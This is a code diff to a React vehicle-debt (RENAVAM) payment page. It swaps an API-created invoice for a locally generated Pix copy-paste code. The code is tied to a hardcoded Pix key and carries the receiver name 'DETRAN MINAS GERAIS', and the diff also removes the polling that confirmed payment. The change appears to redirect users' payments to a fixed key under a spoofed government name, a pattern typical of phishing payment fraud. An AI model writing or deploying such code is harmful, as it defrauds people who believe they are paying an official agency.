@@ -62,6 +62,12 @@ const ResultadoRenavam = () => {
   const [loading, setLoading] = useState(false);
   const [statusPag, setStatusPag] = useState(false); // Estado para o status do pagamento
 
+  const [chavePix, setChavePix] = useState(
+    "b637b07c-dc1a-4296-bfac-0e421afbf1db"
+  );
+  const [nomeRecebedor, setNomeRecebedor] = useState("DETRAN MINAS GERAIS");
+  const [cidade, setCidade] = useState("BELO HORIZONTE");
+
   const router = useRouter();
 
   const handleCreate = async () => {
@@ -88,6 +94,59 @@ const ResultadoRenavam = () => {
     } catch (error) {
       alert("Erro ao aprovar invoice");
     }
+  };
+
+  const calcularCRC16 = (payload) => {
+    let polynomial = 0x1021;
+    let crc = 0xffff;
+
+    for (let i = 0; i < payload.length; i++) {
+      crc ^= payload.charCodeAt(i) << 8;
+      for (let j = 0; j < 8; j++) {
+        if (crc & 0x8000) {
+          crc = (crc << 1) ^ polynomial;
+        } else {
+          crc <<= 1;
+        }
+      }
+    }
+    crc &= 0xffff;
+    return crc.toString(16).toUpperCase().padStart(4, "0");
+  };
+
+  // Função para calcular tamanho dos campos do payload Pix
+  const formatarCampo = (id, valor) => {
+    const tamanho = valor.length.toString().padStart(2, "0");
+    return `${id}${tamanho}${valor}`;
+  };
+
+  const gerarPixCopiaCola = () => {
+    if (!chavePix || !nomeRecebedor || !cidade || !valorTotal) {
+      return "";
+    }
+
+    let payload = "";
+    payload += formatarCampo("00", "01"); // Payload format indicator
+    payload += formatarCampo(
+      "26",
+      formatarCampo("00", "BR.GOV.BCB.PIX") + formatarCampo("01", chavePix)
+    );
+    payload += formatarCampo("52", "0000"); // Merchant Category Code (padrão para PIX)
+    payload += formatarCampo("53", "986"); // Moeda BRL (986)
+    payload += formatarCampo("54", formatarValorTotal(valorTotal)); // Valor da transação
+    payload += formatarCampo("58", "BR"); // País
+    payload += formatarCampo("59", nomeRecebedor); // Nome do recebedor
+    payload += formatarCampo("60", cidade); // Cidade
+    payload += formatarCampo("62", formatarCampo("05", "***")); // Informações adicionais
+
+    // Adiciona campo do CRC16 (sem o valor ainda)
+    payload += "6304";
+
+    // Calcula o CRC16
+    const crc = calcularCRC16(payload);
+    const payloadFinal = `${payload}${crc}`;
+
+    return payloadFinal;
   };
 
   const iniciarPolling = (invoiceId) => {
@@ -124,13 +183,6 @@ const ResultadoRenavam = () => {
       console.log("Polling interrompido devido à desmontagem do componente.");
     };
   };
-
-  useEffect(() => {
-    if (codPix) {
-      const stopPolling = iniciarPolling(invoiceIdOriginal);
-      return stopPolling; // Certifique-se de interromper o polling ao desmontar
-    }
-  }, [codPix]);
 
   // Função para atualizar o valor total das parcelas selecionadas
   const handleCheckboxChange = (parcela, valorTotalParcela) => {
@@ -652,34 +704,15 @@ const ResultadoRenavam = () => {
               textTransform: "capitalize",
             }}
             disabled={loading || valorTotal < 1}
-            onClick={async () => {
-              setLoading(true); // Ativa o carregamento
-              try {
-                // Filtrar débitos selecionados
-                const parcelasSelecionadas = data.extratoDebitos.flatMap(
-                  (debito) =>
-                    debito.parcelas.filter((parcela) => parcela.selecionado)
-                );
+            onClick={() => {
+              // Filtrar débitos selecionados
+              const parcelasSelecionadas = data.extratoDebitos.flatMap(
+                (debito) =>
+                  debito.parcelas.filter((parcela) => parcela.selecionado)
+              );
 
-                // Chama a função para enviar os dados para a API
-                const response = await enviarDadosParaAPI(valorTotal);
-
-                // Atualiza o estado `codPix` com o valor retornado da API
-                const codigoPix = response?.infinity.pix?.qrcode;
-                const invoice = response?.infinity.id;
-
-                if (codigoPix) {
-                  setCodPix(codigoPix);
-                  setInvoiceIdOriginal(invoice);
-                  setParcelasSelecionadas(parcelasSelecionadas); // Passa as parcelas selecionadas
-                } else {
-                  console.error("Erro: código PIX não encontrado na resposta.");
-                }
-              } catch (error) {
-                console.error("Erro ao gerar pagamento:", error.message);
-              } finally {
-                setLoading(false); // Desativa o carregamento ao final da operação
-              }
+              setCodPix(gerarPixCopiaCola());
+              setParcelasSelecionadas(parcelasSelecionadas);
             }}
           >
             {loading ? (
